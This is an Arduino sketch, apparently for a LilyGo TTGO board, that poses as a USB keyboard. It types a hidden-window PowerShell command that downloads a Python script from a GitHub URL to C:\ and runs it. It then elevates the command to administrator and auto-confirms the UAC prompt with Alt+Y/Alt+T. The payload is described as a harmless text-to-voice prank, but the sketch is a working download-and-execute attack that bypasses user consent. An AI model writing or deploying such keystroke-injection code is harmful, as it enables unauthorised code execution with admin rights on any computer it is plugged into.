//this script will download python script "text_to_voice.py" from github repo to C:\, it will then be executed
//after few seconds there will be voice coming from the PC
//script can be found separately in our repo

#include <Keyboard.h>

void setup() {
  //initialize keyboard
  Keyboard.begin();
  delay(1500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  //download script and run it
  Keyboard.print("powershell /w 1 /C wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/text_to_voice.py\" -o c:\\lol.py;C:\\lol.py");

  delay(1000);

  //run ad admin
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(2000);

  //confirm running as admin
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y'); //accept on EN OS
  Keyboard.press('t'); //accept on polish OS 
  delay(100);
  Keyboard.releaseAll();

  delay(300);
  Keyboard.end()
}
void loop() {

}
